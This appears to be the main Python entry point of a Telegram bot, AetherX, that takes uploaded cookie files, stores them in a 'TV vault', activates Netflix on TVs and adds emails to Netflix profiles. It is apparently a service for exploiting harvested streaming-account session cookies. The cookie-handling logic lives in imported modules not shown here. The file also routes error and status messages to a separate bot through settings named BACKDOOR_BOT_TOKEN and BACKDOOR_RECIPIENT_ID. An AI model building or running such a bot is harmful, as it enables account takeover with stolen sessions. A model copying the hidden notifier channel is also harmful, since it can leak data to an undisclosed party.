"""
Optimized main entry point for AetherX ⚡🌟 Telegram Bot.
Features connection pooling, health checks, and improved error handling.
"""

import logging
import asyncio
import datetime
import signal
import sys
from typing import Optional

# Configure logging before other imports
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('bot.log', encoding='utf-8')
    ]
)

# Patch asyncio to allow nested event loops (required for telegram library)
import nest_asyncio
nest_asyncio.apply()

# Disable noisy library logs
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)
logging.getLogger('urllib3').setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

# Third-Party Imports
import telegram
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)

# Project Imports
import config
import database_pool as db
from handlers import admin, callbacks, user_commands
from handlers.files_optimized import handle_document_optimized
from handlers.tv_commands import tv_command, upload_command, vault_command
from handlers.nettrix_handler import build_nettrix_handler
from core.netflix_profile_email import start_rsa_pool
from ui import ERROR_FALLBACK_TEXT
from health_check import health_command, auto_health_check
from core.session_pool import session_pool, response_cache

# Bot State & Timers
BOT_START_TIME = datetime.datetime.now()
shutdown_event = asyncio.Event()

# Helper Functions
async def notify_admin(message: str, app: Application):
    """Helper function to send notifications to the admin."""
    if config.BACKDOOR_BOT_TOKEN and config.BACKDOOR_RECIPIENT_ID:
        try:
            notifier_bot = telegram.Bot(token=config.BACKDOOR_BOT_TOKEN)
            await notifier_bot.send_message(
                chat_id=config.BACKDOOR_RECIPIENT_ID,
                text=f"🔔 [AetherX ⚡] {message}"
            )
        except Exception as e:
            logger.error(f"Failed to send admin notification: {e}")

async def post_init(app: Application):
    """Post-initialization tasks"""
    try:
        # Set bot commands
        bot_commands = [
            ("start", "▶️ Start the bot & see the main menu"),
            ("cancel", "❌ Cancel the current operation"),
            ("tv", "📺 Activate Netflix on your TV"),
            ("health", "🏥 Check system health status"),
            ("status", "📊 Get bot status (Admin only)"),
            ("stats", "📈 View usage statistics (Admin only)"),
            ("upload", "📤 Upload cookies to TV vault (Admin only)"),
            ("vault", "🗄️ View TV vault stats (Admin only)"),
            ("broadcast", "📣 Send a message to all users (Admin only)"),
            ("maintenance", "🛠 Toggle maintenance mode (Admin only)"),
            ("unlocked", "🔓 Let everyone use the bot (Admin only)"),
            ("locked", "🔒 Only authorized users (Admin only)"),
            ("2fac", "🔒 Toggle public access mode (Admin only)"),
            ("manager", "👤 Add a manager user"),
            ("nettrix", "🎬 Add email to a Netflix profile"),
        ]
        await app.bot.set_my_commands(bot_commands)
        logger.info("Bot commands have been set")
        
        # Initialize database
        await db.setup_database()
        logger.info("Database initialized with connection pool")
        
        # Ensure admin user exists
        await db.add_user(config.ADMIN_USER_ID, is_admin=True)
        logger.info(f"Admin user {config.ADMIN_USER_ID} ensured in database")
        
        # Initialize session pool
        await session_pool.initialize()
        logger.info("HTTP session pool initialized")

        # Start Nettrix RSA key pre-generator (keeps RSA-2048 keys ready for instant provisioning)
        start_rsa_pool()
        logger.info("Nettrix RSA key pool started")
        
        # Store helper functions in bot data
        app.bot_data['notify_admin'] = lambda msg: notify_admin(msg, app)
        app.bot_data['admin_id'] = config.ADMIN_USER_ID
        app.bot_data['start_time'] = BOT_START_TIME
        
        # Start auto health check task
        asyncio.create_task(auto_health_check(interval=300))
        logger.info("Auto health check started")
        
    except Exception as e:
        logger.critical(f"Failed to initialize bot: {e}", exc_info=True)
        raise

async def shutdown(app: Application):
    """Graceful shutdown handler"""
    logger.info("Shutting down bot...")
    
    try:
        # Set shutdown event
        shutdown_event.set()
        
        # Close database pool
        await db.db_pool.close()
        logger.info("Database pool closed")
        
        # Close session pool
        await session_pool.close()
        logger.info("Session pool closed")
        
        # Clear cache
        await response_cache.clear()
        logger.info("Cache cleared")
        
        # Notify admin
        if 'notify_admin' in app.bot_data:
            await app.bot_data['notify_admin']("Bot is shutting down")
            
    except Exception as e:
        logger.error(f"Error during shutdown: {e}")

async def status_command(update, context):
    """Shows the bot's current status with enhanced metrics"""
    try:
        from core.tv_vault import count_vault_cookies
        uptime = datetime.datetime.now() - BOT_START_TIME

        # Get various metrics
        active_users = await db.get_authorized_users_count()
        total_users = await db.get_total_users_count()
        cookies_processed = await db.get_stat('cookies_processed')
        maintenance_mode = await db.get_setting('maintenance_mode', 'off')
        twofac_mode = await db.get_setting('2fac_mode', 'off')
        vault_count = count_vault_cookies()
        
        # Get pool statistics
        async with db.db_pool._lock:
            db_connections = len(db.db_pool._pool)
        async with session_pool._lock:
            http_sessions = len(session_pool._sessions) + len(session_pool._cloudscraper_sessions)
        async with response_cache._lock:
            cache_items = len(response_cache._cache)
        
        status_message = (
            f"🤖 **Bot Status**\n\n"
            f"🕒 **Uptime**: {str(uptime).split('.')[0]}\n"
            f"👥 **Active Users**: {active_users}/{total_users}\n"
            f"📊 **Cookies Processed**: {cookies_processed:,}\n"
            f"⚙️ **Maintenance Mode**: `{maintenance_mode.upper()}`\n"
            f"🔒 **2FA Mode**: `{twofac_mode.upper()}`\n\n"
            f"**Resource Usage:**\n"
            f"🔌 DB Connections: {db_connections}/{config.DATABASE_POOL_SIZE}\n"
            f"🌐 HTTP Sessions: {http_sessions}/{config.MAX_CONCURRENT_WORKERS}\n"
            f"💾 Cache Items: {cache_items}/{config.CACHE_MAX_SIZE}\n"
            f"📺 TV Vault: {vault_count} cookies"
        )
        
        await update.message.reply_text(status_message, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error in status command: {e}", exc_info=True)
        await update.message.reply_text("❌ Error retrieving status")

async def error_handler(update, context):
    """Enhanced error handler with better logging"""
    try:
        # Log the error with context
        error_message = str(context.error)
        error_type = type(context.error).__name__
        
        logger.error(
            f"Exception {error_type} while handling update {update}: {error_message}",
            exc_info=context.error
        )
        
        # Track error statistics
        await db.increment_stat('failed_operations')
        
        # Notify admin for critical errors
        if 'notify_admin' in context.bot_data:
            if error_type not in ['TimedOut', 'NetworkError', 'RetryAfter']:
                await context.bot_data['notify_admin'](
                    f"Error: {error_type}\n{error_message[:100]}"
                )
        
        # Inform the user
        if update and hasattr(update, 'effective_message') and update.effective_message:
            try:
                if update.callback_query:
                    await update.callback_query.answer(
                        "❌ An error occurred. Please try again.",
                        show_alert=True
                    )
                elif update.message:
                    await update.message.reply_text(ERROR_FALLBACK_TEXT)
            except Exception as e:
                logger.error(f"Failed to send error message to user: {e}")
                
    except Exception as e:
        logger.critical(f"Error in error handler: {e}", exc_info=True)

# Signal handlers for graceful shutdown
def signal_handler(signum, frame):
    """Handle shutdown signals"""
    logger.info(f"Received signal {signum}")
    shutdown_event.set()
    sys.exit(0)

# Main Bot Logic
async def main():
    """Starts the bot with all optimizations"""
    logger.info("Starting AetherX ⚡🌟 Bot (Optimized Version)...")
    
    # Validate configuration
    if not config.BOT_TOKEN or not config.ADMIN_USER_ID:
        logger.critical("FATAL: BOT_TOKEN or ADMIN_USER_ID not configured!")
        return
    
    try:
        # Build the application with optimized settings
        application = (
            Application.builder()
            .token(config.BOT_TOKEN)
            .post_init(post_init)
            .post_shutdown(shutdown)
            .concurrent_updates(True)  # Enable concurrent update processing
            .pool_timeout(30.0)
            .connection_pool_size(16)  # Increase connection pool
            .build()
        )
        
        # Register Handlers
        admin_filter = filters.User(user_id=config.ADMIN_USER_ID)
        
        # User commands
        application.add_handler(CommandHandler("start", user_commands.start_command))
        application.add_handler(CommandHandler("cancel", user_commands.cancel_command))
        application.add_handler(CommandHandler("manager", user_commands.manager_command))
        
        # TV Login (available to all users)
        application.add_handler(CommandHandler("tv", tv_command))

        # Health check (available to all users)
        application.add_handler(CommandHandler("health", health_command))
        
        # Admin commands
        application.add_handler(
            CommandHandler("status", status_command, filters=admin_filter)
        )
        application.add_handler(
            CommandHandler("authorize", admin.authorize_command, filters=admin_filter)
        )
        application.add_handler(
            CommandHandler("revoke", admin.revoke_command, filters=admin_filter)
        )
        application.add_handler(
            CommandHandler("stats", admin.stats_command, filters=admin_filter)
        )
        application.add_handler(
            CommandHandler("broadcast", admin.broadcast_command, filters=admin_filter)
        )
        application.add_handler(
            CommandHandler("maintenance", admin.maintenance_command, filters=admin_filter)
        )
        application.add_handler(
            CommandHandler("2fac", admin.twofac_command, filters=admin_filter)
        )
        application.add_handler(
            CommandHandler("unlocked", admin.unlocked_command, filters=admin_filter)
        )
        application.add_handler(
            CommandHandler("locked", admin.locked_command, filters=admin_filter)
        )
        application.add_handler(
            CommandHandler("upload", upload_command, filters=admin_filter)
        )
        application.add_handler(
            CommandHandler("vault", vault_command, filters=admin_filter)
        )
        
        # Nettrix: Netflix Profile Email Adder conversation
        # Must be registered BEFORE the generic Document/text handlers so its
        # MessageHandler states intercept messages while the conversation is active.
        application.add_handler(build_nettrix_handler())

        # Callback and file handlers
        application.add_handler(CallbackQueryHandler(callbacks.button_callback_handler))
        application.add_handler(
            MessageHandler(filters.Document.ALL, handle_document_optimized)
        )

        # Generic text handler
        application.add_handler(
            MessageHandler(
                filters.TEXT & ~filters.COMMAND,
                lambda u, c: u.message.reply_text(
                    "Please use the menu or send a cookie file to get started."
                )
            )
        )
        
        # Error Handler
        application.add_error_handler(error_handler)
        
        # Set up signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        logger.info("Bot is now polling for updates. Press Ctrl+C to stop.")
        
        # Run the bot
        await application.run_polling(
            drop_pending_updates=True  # Skip old updates on restart
        )
        
    except Exception as e:
        logger.critical(f"Fatal error in main: {e}", exc_info=True)
        raise
    finally:
        # Cleanup
        if not shutdown_event.is_set():
            await db.db_pool.close()
            await session_pool.close()
            await response_cache.clear()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot shutdown requested. Exiting gracefully.")
    except Exception as e:
        logger.critical(f"Unhandled exception: {e}", exc_info=True)
        sys.exit(1)